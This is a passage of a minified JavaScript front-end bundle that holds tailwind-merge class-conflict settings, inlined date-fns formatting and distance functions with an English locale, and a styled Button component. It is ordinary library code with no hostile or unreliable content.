]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",at]}],fill:[{fill:[e,"none"]}],"stroke-w":[{stroke:[wi,ra,Zp]}],stroke:[{stroke:[e,"none"]}],sr:["sr-only","not-sr-only"],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-s","border-color-e","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}},H6=E6(B6),fk=6048e5,U6=864e5,ld=43200,Gv=1440,Qv=Symbol.for("constructDateFrom");function Oi(e,t){return typeof e=="function"?e(t):e&&typeof e=="object"&&Qv in e?e[Qv](t):e instanceof Date?new e.constructor(t):new Date(t)}function Tn(e,t){return Oi(t||e,e)}let z6={};function Ku(){return z6}function Lu(e,t){var f,h,m,x;const n=Ku(),r=(t==null?void 0:t.weekStartsOn)??((h=(f=t==null?void 0:t.locale)==null?void 0:f.options)==null?void 0:h.weekStartsOn)??n.weekStartsOn??((x=(m=n.locale)==null?void 0:m.options)==null?void 0:x.weekStartsOn)??0,a=Tn(e,t==null?void 0:t.in),l=a.getDay(),u=(l<r?7:0)+l-r;return a.setDate(a.getDate()-u),a.setHours(0,0,0,0),a}function of(e,t){return Lu(e,{...t,weekStartsOn:1})}function hk(e,t){const n=Tn(e,t==null?void 0:t.in),r=n.getFullYear(),a=Oi(n,0);a.setFullYear(r+1,0,4),a.setHours(0,0,0,0);const l=of(a),u=Oi(n,0);u.setFullYear(r,0,4),u.setHours(0,0,0,0);const f=of(u);return n.getTime()>=l.getTime()?r+1:n.getTime()>=f.getTime()?r:r-1}function uf(e){const t=Tn(e),n=new Date(Date.UTC(t.getFullYear(),t.getMonth(),t.getDate(),t.getHours(),t.getMinutes(),t.getSeconds(),t.getMilliseconds()));return n.setUTCFullYear(t.getFullYear()),+e-+n}function Bf(e,...t){const n=Oi.bind(null,e||t.find(r=>typeof r=="object"));return t.map(n)}function Kv(e,t){const n=Tn(e,t==null?void 0:t.in);return n.setHours(0,0,0,0),n}function W6(e,t,n){const[r,a]=Bf(n==null?void 0:n.in,e,t),l=Kv(r),u=Kv(a),f=+l-uf(l),h=+u-uf(u);return Math.round((f-h)/U6)}function q6(e,t){const n=hk(e,t),r=Oi(e,0);return r.setFullYear(n,0,4),r.setHours(0,0,0,0),of(r)}function Dd(e,t){const n=+Tn(e)-+Tn(t);return n<0?-1:n>0?1:n}function $6(e){return Oi(e,Date.now())}function Y6(e){return e instanceof Date||typeof e=="object"&&Object.prototype.toString.call(e)==="[object Date]"}function V6(e){return!(!Y6(e)&&typeof e!="number"||isNaN(+Tn(e)))}function G6(e,t,n){const[r,a]=Bf(n==null?void 0:n.in,e,t),l=r.getFullYear()-a.getFullYear(),u=r.getMonth()-a.getMonth();return l*12+u}function Q6(e){return t=>{const r=(e?Math[e]:Math.trunc)(t);return r===0?0:r}}function K6(e,t){return+Tn(e)-+Tn(t)}function X6(e,t){const n=Tn(e,t==null?void 0:t.in);return n.setHours(23,59,59,999),n}function Z6(e,t){const n=Tn(e,t==null?void 0:t.in),r=n.getMonth();return n.setFullYear(n.getFullYear(),r+1,0),n.setHours(23,59,59,999),n}function J6(e,t){const n=Tn(e,t==null?void 0:t.in);return+X6(n,t)==+Z6(n,t)}function eL(e,t,n){const[r,a,l]=Bf(n==null?void 0:n.in,e,e,t),u=Dd(a,l),f=Math.abs(G6(a,l));if(f<1)return 0;a.getMonth()===1&&a.getDate()>27&&a.setDate(30),a.setMonth(a.getMonth()-u*f);let h=Dd(a,l)===-u;J6(r)&&f===1&&Dd(r,l)===1&&(h=!1);const m=u*(f-+h);return m===0?0:m}function tL(e,t,n){const r=K6(e,t)/1e3;return Q6(n==null?void 0:n.roundingMethod)(r)}function nL(e,t){const n=Tn(e,t==null?void 0:t.in);return n.setFullYear(n.getFullYear(),0,1),n.setHours(0,0,0,0),n}const rL={lessThanXSeconds:{one:"less than a second",other:"less than {{count}} seconds"},xSeconds:{one:"1 second",other:"{{count}} seconds"},halfAMinute:"half a minute",lessThanXMinutes:{one:"less than a minute",other:"less than {{count}} minutes"},xMinutes:{one:"1 minute",other:"{{count}} minutes"},aboutXHours:{one:"about 1 hour",other:"about {{count}} hours"},xHours:{one:"1 hour",other:"{{count}} hours"},xDays:{one:"1 day",other:"{{count}} days"},aboutXWeeks:{one:"about 1 week",other:"about {{count}} weeks"},xWeeks:{one:"1 week",other:"{{count}} weeks"},aboutXMonths:{one:"about 1 month",other:"about {{count}} months"},xMonths:{one:"1 month",other:"{{count}} months"},aboutXYears:{one:"about 1 year",other:"about {{count}} years"},xYears:{one:"1 year",other:"{{count}} years"},overXYears:{one:"over 1 year",other:"over {{count}} years"},almostXYears:{one:"almost 1 year",other:"almost {{count}} years"}},iL=(e,t,n)=>{let r;const a=rL[e];return typeof a=="string"?r=a:t===1?r=a.one:r=a.other.replace("{{count}}",t.toString()),n!=null&&n.addSuffix?n.comparison&&n.comparison>0?"in "+r:r+" ago":r};function Jp(e){return(t={})=>{const n=t.width?String(t.width):e.defaultWidth;return e.formats[n]||e.formats[e.defaultWidth]}}const aL={full:"EEEE, MMMM do, y",long:"MMMM do, y",medium:"MMM d, y",short:"MM/dd/yyyy"},sL={full:"h:mm:ss a zzzz",long:"h:mm:ss a z",medium:"h:mm:ss a",short:"h:mm a"},lL={full:"{{date}} 'at' {{time}}",long:"{{date}} 'at' {{time}}",medium:"{{date}}, {{time}}",short:"{{date}}, {{time}}"},oL={date:Jp({formats:aL,defaultWidth:"full"}),time:Jp({formats:sL,defaultWidth:"full"}),dateTime:Jp({formats:lL,defaultWidth:"full"})},uL={lastWeek:"'last' eeee 'at' p",yesterday:"'yesterday at' p",today:"'today at' p",tomorrow:"'tomorrow at' p",nextWeek:"eeee 'at' p",other:"P"},cL=(e,t,n,r)=>uL[e];function Ro(e){return(t,n)=>{const r=n!=null&&n.context?String(n.context):"standalone";let a;if(r==="formatting"&&e.formattingValues){const u=e.defaultFormattingWidth||e.defaultWidth,f=n!=null&&n.width?String(n.width):u;a=e.formattingValues[f]||e.formattingValues[u]}else{const u=e.defaultWidth,f=n!=null&&n.width?String(n.width):e.defaultWidth;a=e.values[f]||e.values[u]}const l=e.argumentCallback?e.argumentCallback(t):t;return a[l]}}const dL={narrow:["B","A"],abbreviated:["BC","AD"],wide:["Before Christ","Anno Domini"]},fL={narrow:["1","2","3","4"],abbreviated:["Q1","Q2","Q3","Q4"],wide:["1st quarter","2nd quarter","3rd quarter","4th quarter"]},hL={narrow:["J","F","M","A","M","J","J","A","S","O","N","D"],abbreviated:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],wide:["January","February","March","April","May","June","July","August","September","October","November","December"]},pL={narrow:["S","M","T","W","T","F","S"],short:["Su","Mo","Tu","We","Th","Fr","Sa"],abbreviated:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],wide:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"]},mL={narrow:{am:"a",pm:"p",midnight:"mi",noon:"n",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"},abbreviated:{am:"AM",pm:"PM",midnight:"midnight",noon:"noon",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"},wide:{am:"a.m.",pm:"p.m.",midnight:"midnight",noon:"noon",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"}},gL={narrow:{am:"a",pm:"p",midnight:"mi",noon:"n",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"},abbreviated:{am:"AM",pm:"PM",midnight:"midnight",noon:"noon",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"},wide:{am:"a.m.",pm:"p.m.",midnight:"midnight",noon:"noon",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"}},xL=(e,t)=>{const n=Number(e),r=n%100;if(r>20||r<10)switch(r%10){case 1:return n+"st";case 2:return n+"nd";case 3:return n+"rd"}return n+"th"},yL={ordinalNumber:xL,era:Ro({values:dL,defaultWidth:"wide"}),quarter:Ro({values:fL,defaultWidth:"wide",argumentCallback:e=>e-1}),month:Ro({values:hL,defaultWidth:"wide"}),day:Ro({values:pL,defaultWidth:"wide"}),dayPeriod:Ro({values:mL,defaultWidth:"wide",formattingValues:gL,defaultFormattingWidth:"wide"})};function Oo(e){return(t,n={})=>{const r=n.width,a=r&&e.matchPatterns[r]||e.matchPatterns[e.defaultMatchWidth],l=t.match(a);if(!l)return null;const u=l[0],f=r&&e.parsePatterns[r]||e.parsePatterns[e.defaultParseWidth],h=Array.isArray(f)?bL(f,g=>g.test(u)):vL(f,g=>g.test(u));let m;m=e.valueCallback?e.valueCallback(h):h,m=n.valueCallback?n.valueCallback(m):m;const x=t.slice(u.length);return{value:m,rest:x}}}function vL(e,t){for(const n in e)if(Object.prototype.hasOwnProperty.call(e,n)&&t(e[n]))return n}function bL(e,t){for(let n=0;n<e.length;n++)if(t(e[n]))return n}function EL(e){return(t,n={})=>{const r=t.match(e.matchPattern);if(!r)return null;const a=r[0],l=t.match(e.parsePattern);if(!l)return null;let u=e.valueCallback?e.valueCallback(l[0]):l[0];u=n.valueCallback?n.valueCallback(u):u;const f=t.slice(a.length);return{value:u,rest:f}}}const wL=/^(\d+)(th|st|nd|rd)?/i,kL=/\d+/i,TL={narrow:/^(b|a)/i,abbreviated:/^(b\.?\s?c\.?|b\.?\s?c\.?\s?e\.?|a\.?\s?d\.?|c\.?\s?e\.?)/i,wide:/^(before christ|before common era|anno domini|common era)/i},CL={any:[/^b/i,/^(a|c)/i]},SL={narrow:/^[1234]/i,abbreviated:/^q[1234]/i,wide:/^[1234](th|st|nd|rd)? quarter/i},NL={any:[/1/i,/2/i,/3/i,/4/i]},AL={narrow:/^[jfmasond]/i,abbreviated:/^(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)/i,wide:/^(january|february|march|april|may|june|july|august|september|october|november|december)/i},DL={narrow:[/^j/i,/^f/i,/^m/i,/^a/i,/^m/i,/^j/i,/^j/i,/^a/i,/^s/i,/^o/i,/^n/i,/^d/i],any:[/^ja/i,/^f/i,/^mar/i,/^ap/i,/^may/i,/^jun/i,/^jul/i,/^au/i,/^s/i,/^o/i,/^n/i,/^d/i]},LL={narrow:/^[smtwf]/i,short:/^(su|mo|tu|we|th|fr|sa)/i,abbreviated:/^(sun|mon|tue|wed|thu|fri|sat)/i,wide:/^(sunday|monday|tuesday|wednesday|thursday|friday|saturday)/i},_L={narrow:[/^s/i,/^m/i,/^t/i,/^w/i,/^t/i,/^f/i,/^s/i],any:[/^su/i,/^m/i,/^tu/i,/^w/i,/^th/i,/^f/i,/^sa/i]},IL={narrow:/^(a|p|mi|n|(in the|at) (morning|afternoon|evening|night))/i,any:/^([ap]\.?\s?m\.?|midnight|noon|(in the|at) (morning|afternoon|evening|night))/i},PL={any:{am:/^a/i,pm:/^p/i,midnight:/^mi/i,noon:/^no/i,morning:/morning/i,afternoon:/afternoon/i,evening:/evening/i,night:/night/i}},jL={ordinalNumber:EL({matchPattern:wL,parsePattern:kL,valueCallback:e=>parseInt(e,10)}),era:Oo({matchPatterns:TL,defaultMatchWidth:"wide",parsePatterns:CL,defaultParseWidth:"any"}),quarter:Oo({matchPatterns:SL,defaultMatchWidth:"wide",parsePatterns:NL,defaultParseWidth:"any",valueCallback:e=>e+1}),month:Oo({matchPatterns:AL,defaultMatchWidth:"wide",parsePatterns:DL,defaultParseWidth:"any"}),day:Oo({matchPatterns:LL,defaultMatchWidth:"wide",parsePatterns:_L,defaultParseWidth:"any"}),dayPeriod:Oo({matchPatterns:IL,defaultMatchWidth:"any",parsePatterns:PL,defaultParseWidth:"any"})},pk={code:"en-US",formatDistance:iL,formatLong:oL,formatRelative:cL,localize:yL,match:jL,options:{weekStartsOn:0,firstWeekContainsDate:1}};function RL(e,t){const n=Tn(e,t==null?void 0:t.in);return W6(n,nL(n))+1}function OL(e,t){const n=Tn(e,t==null?void 0:t.in),r=+of(n)-+q6(n);return Math.round(r/fk)+1}function mk(e,t){var x,g,b,E;const n=Tn(e,t==null?void 0:t.in),r=n.getFullYear(),a=Ku(),l=(t==null?void 0:t.firstWeekContainsDate)??((g=(x=t==null?void 0:t.locale)==null?void 0:x.options)==null?void 0:g.firstWeekContainsDate)??a.firstWeekContainsDate??((E=(b=a.locale)==null?void 0:b.options)==null?void 0:E.firstWeekContainsDate)??1,u=Oi((t==null?void 0:t.in)||e,0);u.setFullYear(r+1,0,l),u.setHours(0,0,0,0);const f=Lu(u,t),h=Oi((t==null?void 0:t.in)||e,0);h.setFullYear(r,0,l),h.setHours(0,0,0,0);const m=Lu(h,t);return+n>=+f?r+1:+n>=+m?r:r-1}function FL(e,t){var f,h,m,x;const n=Ku(),r=(t==null?void 0:t.firstWeekContainsDate)??((h=(f=t==null?void 0:t.locale)==null?void 0:f.options)==null?void 0:h.firstWeekContainsDate)??n.firstWeekContainsDate??((x=(m=n.locale)==null?void 0:m.options)==null?void 0:x.firstWeekContainsDate)??1,a=mk(e,t),l=Oi((t==null?void 0:t.in)||e,0);return l.setFullYear(a,0,r),l.setHours(0,0,0,0),Lu(l,t)}function ML(e,t){const n=Tn(e,t==null?void 0:t.in),r=+Lu(n,t)-+FL(n,t);return Math.round(r/fk)+1}function Ct(e,t){const n=e<0?"-":"",r=Math.abs(e).toString().padStart(t,"0");return n+r}const aa={y(e,t){const n=e.getFullYear(),r=n>0?n:1-n;return Ct(t==="yy"?r%100:r,t.length)},M(e,t){const n=e.getMonth();return t==="M"?String(n+1):Ct(n+1,2)},d(e,t){return Ct(e.getDate(),t.length)},a(e,t){const n=e.getHours()/12>=1?"pm":"am";switch(t){case"a":case"aa":return n.toUpperCase();case"aaa":return n;case"aaaaa":return n[0];case"aaaa":default:return n==="am"?"a.m.":"p.m."}},h(e,t){return Ct(e.getHours()%12||12,t.length)},H(e,t){return Ct(e.getHours(),t.length)},m(e,t){return Ct(e.getMinutes(),t.length)},s(e,t){return Ct(e.getSeconds(),t.length)},S(e,t){const n=t.length,r=e.getMilliseconds(),a=Math.trunc(r*Math.pow(10,n-3));return Ct(a,t.length)}},Ys={midnight:"midnight",noon:"noon",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"},Xv={G:function(e,t,n){const r=e.getFullYear()>0?1:0;switch(t){case"G":case"GG":case"GGG":return n.era(r,{width:"abbreviated"});case"GGGGG":return n.era(r,{width:"narrow"});case"GGGG":default:return n.era(r,{width:"wide"})}},y:function(e,t,n){if(t==="yo"){const r=e.getFullYear(),a=r>0?r:1-r;return n.ordinalNumber(a,{unit:"year"})}return aa.y(e,t)},Y:function(e,t,n,r){const a=mk(e,r),l=a>0?a:1-a;if(t==="YY"){const u=l%100;return Ct(u,2)}return t==="Yo"?n.ordinalNumber(l,{unit:"year"}):Ct(l,t.length)},R:function(e,t){const n=hk(e);return Ct(n,t.length)},u:function(e,t){const n=e.getFullYear();return Ct(n,t.length)},Q:function(e,t,n){const r=Math.ceil((e.getMonth()+1)/3);switch(t){case"Q":return String(r);case"QQ":return Ct(r,2);case"Qo":return n.ordinalNumber(r,{unit:"quarter"});case"QQQ":return n.quarter(r,{width:"abbreviated",context:"formatting"});case"QQQQQ":return n.quarter(r,{width:"narrow",context:"formatting"});case"QQQQ":default:return n.quarter(r,{width:"wide",context:"formatting"})}},q:function(e,t,n){const r=Math.ceil((e.getMonth()+1)/3);switch(t){case"q":return String(r);case"qq":return Ct(r,2);case"qo":return n.ordinalNumber(r,{unit:"quarter"});case"qqq":return n.quarter(r,{width:"abbreviated",context:"standalone"});case"qqqqq":return n.quarter(r,{width:"narrow",context:"standalone"});case"qqqq":default:return n.quarter(r,{width:"wide",context:"standalone"})}},M:function(e,t,n){const r=e.getMonth();switch(t){case"M":case"MM":return aa.M(e,t);case"Mo":return n.ordinalNumber(r+1,{unit:"month"});case"MMM":return n.month(r,{width:"abbreviated",context:"formatting"});case"MMMMM":return n.month(r,{width:"narrow",context:"formatting"});case"MMMM":default:return n.month(r,{width:"wide",context:"formatting"})}},L:function(e,t,n){const r=e.getMonth();switch(t){case"L":return String(r+1);case"LL":return Ct(r+1,2);case"Lo":return n.ordinalNumber(r+1,{unit:"month"});case"LLL":return n.month(r,{width:"abbreviated",context:"standalone"});case"LLLLL":return n.month(r,{width:"narrow",context:"standalone"});case"LLLL":default:return n.month(r,{width:"wide",context:"standalone"})}},w:function(e,t,n,r){const a=ML(e,r);return t==="wo"?n.ordinalNumber(a,{unit:"week"}):Ct(a,t.length)},I:function(e,t,n){const r=OL(e);return t==="Io"?n.ordinalNumber(r,{unit:"week"}):Ct(r,t.length)},d:function(e,t,n){return t==="do"?n.ordinalNumber(e.getDate(),{unit:"date"}):aa.d(e,t)},D:function(e,t,n){const r=RL(e);return t==="Do"?n.ordinalNumber(r,{unit:"dayOfYear"}):Ct(r,t.length)},E:function(e,t,n){const r=e.getDay();switch(t){case"E":case"EE":case"EEE":return n.day(r,{width:"abbreviated",context:"formatting"});case"EEEEE":return n.day(r,{width:"narrow",context:"formatting"});case"EEEEEE":return n.day(r,{width:"short",context:"formatting"});case"EEEE":default:return n.day(r,{width:"wide",context:"formatting"})}},e:function(e,t,n,r){const a=e.getDay(),l=(a-r.weekStartsOn+8)%7||7;switch(t){case"e":return String(l);case"ee":return Ct(l,2);case"eo":return n.ordinalNumber(l,{unit:"day"});case"eee":return n.day(a,{width:"abbreviated",context:"formatting"});case"eeeee":return n.day(a,{width:"narrow",context:"formatting"});case"eeeeee":return n.day(a,{width:"short",context:"formatting"});case"eeee":default:return n.day(a,{width:"wide",context:"formatting"})}},c:function(e,t,n,r){const a=e.getDay(),l=(a-r.weekStartsOn+8)%7||7;switch(t){case"c":return String(l);case"cc":return Ct(l,t.length);case"co":return n.ordinalNumber(l,{unit:"day"});case"ccc":return n.day(a,{width:"abbreviated",context:"standalone"});case"ccccc":return n.day(a,{width:"narrow",context:"standalone"});case"cccccc":return n.day(a,{width:"short",context:"standalone"});case"cccc":default:return n.day(a,{width:"wide",context:"standalone"})}},i:function(e,t,n){const r=e.getDay(),a=r===0?7:r;switch(t){case"i":return String(a);case"ii":return Ct(a,t.length);case"io":return n.ordinalNumber(a,{unit:"day"});case"iii":return n.day(r,{width:"abbreviated",context:"formatting"});case"iiiii":return n.day(r,{width:"narrow",context:"formatting"});case"iiiiii":return n.day(r,{width:"short",context:"formatting"});case"iiii":default:return n.day(r,{width:"wide",context:"formatting"})}},a:function(e,t,n){const a=e.getHours()/12>=1?"pm":"am";switch(t){case"a":case"aa":return n.dayPeriod(a,{width:"abbreviated",context:"formatting"});case"aaa":return n.dayPeriod(a,{width:"abbreviated",context:"formatting"}).toLowerCase();case"aaaaa":return n.dayPeriod(a,{width:"narrow",context:"formatting"});case"aaaa":default:return n.dayPeriod(a,{width:"wide",context:"formatting"})}},b:function(e,t,n){const r=e.getHours();let a;switch(r===12?a=Ys.noon:r===0?a=Ys.midnight:a=r/12>=1?"pm":"am",t){case"b":case"bb":return n.dayPeriod(a,{width:"abbreviated",context:"formatting"});case"bbb":return n.dayPeriod(a,{width:"abbreviated",context:"formatting"}).toLowerCase();case"bbbbb":return n.dayPeriod(a,{width:"narrow",context:"formatting"});case"bbbb":default:return n.dayPeriod(a,{width:"wide",context:"formatting"})}},B:function(e,t,n){const r=e.getHours();let a;switch(r>=17?a=Ys.evening:r>=12?a=Ys.afternoon:r>=4?a=Ys.morning:a=Ys.night,t){case"B":case"BB":case"BBB":return n.dayPeriod(a,{width:"abbreviated",context:"formatting"});case"BBBBB":return n.dayPeriod(a,{width:"narrow",context:"formatting"});case"BBBB":default:return n.dayPeriod(a,{width:"wide",context:"formatting"})}},h:function(e,t,n){if(t==="ho"){let r=e.getHours()%12;return r===0&&(r=12),n.ordinalNumber(r,{unit:"hour"})}return aa.h(e,t)},H:function(e,t,n){return t==="Ho"?n.ordinalNumber(e.getHours(),{unit:"hour"}):aa.H(e,t)},K:function(e,t,n){const r=e.getHours()%12;return t==="Ko"?n.ordinalNumber(r,{unit:"hour"}):Ct(r,t.length)},k:function(e,t,n){let r=e.getHours();return r===0&&(r=24),t==="ko"?n.ordinalNumber(r,{unit:"hour"}):Ct(r,t.length)},m:function(e,t,n){return t==="mo"?n.ordinalNumber(e.getMinutes(),{unit:"minute"}):aa.m(e,t)},s:function(e,t,n){return t==="so"?n.ordinalNumber(e.getSeconds(),{unit:"second"}):aa.s(e,t)},S:function(e,t){return aa.S(e,t)},X:function(e,t,n){const r=e.getTimezoneOffset();if(r===0)return"Z";switch(t){case"X":return Jv(r);case"XXXX":case"XX":return Ja(r);case"XXXXX":case"XXX":default:return Ja(r,":")}},x:function(e,t,n){const r=e.getTimezoneOffset();switch(t){case"x":return Jv(r);case"xxxx":case"xx":return Ja(r);case"xxxxx":case"xxx":default:return Ja(r,":")}},O:function(e,t,n){const r=e.getTimezoneOffset();switch(t){case"O":case"OO":case"OOO":return"GMT"+Zv(r,":");case"OOOO":default:return"GMT"+Ja(r,":")}},z:function(e,t,n){const r=e.getTimezoneOffset();switch(t){case"z":case"zz":case"zzz":return"GMT"+Zv(r,":");case"zzzz":default:return"GMT"+Ja(r,":")}},t:function(e,t,n){const r=Math.trunc(+e/1e3);return Ct(r,t.length)},T:function(e,t,n){return Ct(+e,t.length)}};function Zv(e,t=""){const n=e>0?"-":"+",r=Math.abs(e),a=Math.trunc(r/60),l=r%60;return l===0?n+String(a):n+String(a)+t+Ct(l,2)}function Jv(e,t){return e%60===0?(e>0?"-":"+")+Ct(Math.abs(e)/60,2):Ja(e,t)}function Ja(e,t=""){const n=e>0?"-":"+",r=Math.abs(e),a=Ct(Math.trunc(r/60),2),l=Ct(r%60,2);return n+a+t+l}const eb=(e,t)=>{switch(e){case"P":return t.date({width:"short"});case"PP":return t.date({width:"medium"});case"PPP":return t.date({width:"long"});case"PPPP":default:return t.date({width:"full"})}},gk=(e,t)=>{switch(e){case"p":return t.time({width:"short"});case"pp":return t.time({width:"medium"});case"ppp":return t.time({width:"long"});case"pppp":default:return t.time({width:"full"})}},BL=(e,t)=>{const n=e.match(/(P+)(p+)?/)||[],r=n[1],a=n[2];if(!a)return eb(e,t);let l;switch(r){case"P":l=t.dateTime({width:"short"});break;case"PP":l=t.dateTime({width:"medium"});break;case"PPP":l=t.dateTime({width:"long"});break;case"PPPP":default:l=t.dateTime({width:"full"});break}return l.replace("{{date}}",eb(r,t)).replace("{{time}}",gk(a,t))},HL={p:gk,P:BL},UL=/^D+$/,zL=/^Y+$/,WL=["D","DD","YY","YYYY"];function qL(e){return UL.test(e)}function $L(e){return zL.test(e)}function YL(e,t,n){const r=VL(e,t,n);if(console.warn(r),WL.includes(e))throw new RangeError(r)}function VL(e,t,n){const r=e[0]==="Y"?"years":"days of the month";return`Use \`${e.toLowerCase()}\` instead of \`${e}\` (in \`${t}\`) for formatting ${r} to the input \`${n}\`; see: https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md`}const GL=/[yYQqMLwIdDecihHKkms]o|(\w)\1*|''|'(''|[^'])+('|$)|./g,QL=/P+p+|P+|p+|''|'(''|[^'])+('|$)|./g,KL=/^'([^]*?)'?$/,XL=/''/g,ZL=/[a-zA-Z]/;function Ui(e,t,n){var x,g,b,E;const r=Ku(),a=r.locale??pk,l=r.firstWeekContainsDate??((g=(x=r.locale)==null?void 0:x.options)==null?void 0:g.firstWeekContainsDate)??1,u=r.weekStartsOn??((E=(b=r.locale)==null?void 0:b.options)==null?void 0:E.weekStartsOn)??0,f=Tn(e,n==null?void 0:n.in);if(!V6(f))throw new RangeError("Invalid time value");let h=t.match(QL).map(C=>{const P=C[0];if(P==="p"||P==="P"){const O=HL[P];return O(C,a.formatLong)}return C}).join("").match(GL).map(C=>{if(C==="''")return{isToken:!1,value:"'"};const P=C[0];if(P==="'")return{isToken:!1,value:JL(C)};if(Xv[P])return{isToken:!0,value:C};if(P.match(ZL))throw new RangeError("Format string contains an unescaped latin alphabet character `"+P+"`");return{isToken:!1,value:C}});a.localize.preprocessor&&(h=a.localize.preprocessor(f,h));const m={firstWeekContainsDate:l,weekStartsOn:u,locale:a};return h.map(C=>{if(!C.isToken)return C.value;const P=C.value;($L(P)||qL(P))&&YL(P,t,String(e));const O=Xv[P[0]];return O(f,P,a.localize,m)}).join("")}function JL(e){const t=e.match(KL);return t?t[1].replace(XL,"'"):e}function e_(e,t,n){const r=Ku(),a=(n==null?void 0:n.locale)??r.locale??pk,l=2520,u=Dd(e,t);if(isNaN(u))throw new RangeError("Invalid time value");const f=Object.assign({},n,{addSuffix:n==null?void 0:n.addSuffix,comparison:u}),[h,m]=Bf(n==null?void 0:n.in,...u>0?[t,e]:[e,t]),x=tL(m,h),g=(uf(m)-uf(h))/1e3,b=Math.round((x-g)/60);let E;if(b<2)return n!=null&&n.includeSeconds?x<5?a.formatDistance("lessThanXSeconds",5,f):x<10?a.formatDistance("lessThanXSeconds",10,f):x<20?a.formatDistance("lessThanXSeconds",20,f):x<40?a.formatDistance("halfAMinute",0,f):x<60?a.formatDistance("lessThanXMinutes",1,f):a.formatDistance("xMinutes",1,f):b===0?a.formatDistance("lessThanXMinutes",1,f):a.formatDistance("xMinutes",b,f);if(b<45)return a.formatDistance("xMinutes",b,f);if(b<90)return a.formatDistance("aboutXHours",1,f);if(b<Gv){const C=Math.round(b/60);return a.formatDistance("aboutXHours",C,f)}else{if(b<l)return a.formatDistance("xDays",1,f);if(b<ld){const C=Math.round(b/Gv);return a.formatDistance("xDays",C,f)}else if(b<ld*2)return E=Math.round(b/ld),a.formatDistance("aboutXMonths",E,f)}if(E=eL(m,h),E<12){const C=Math.round(b/ld);return a.formatDistance("xMonths",C,f)}else{const C=E%12,P=Math.trunc(E/12);return C<3?a.formatDistance("aboutXYears",P,f):C<9?a.formatDistance("overXYears",P,f):a.formatDistance("almostXYears",P+1,f)}}function t_(e,t){return e_(e,$6(e),t)}function n_(...e){return H6(sk(e))}function r_(e){return e?Ui(new Date(e),"MMM dd, yyyy"):""}const i_=o6("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),Ee=j.forwardRef(({className:e,variant:t,size:n,asChild:r=!1,...a},l)=>{const u=r?n6:"button";return o.jsx(u,{className:n_(i_({variant:t,size:n,className:e})),ref:l,...a})});Ee.displayName="Button";var a_={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const s_=e=>e.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),He=(e,t)=>{const 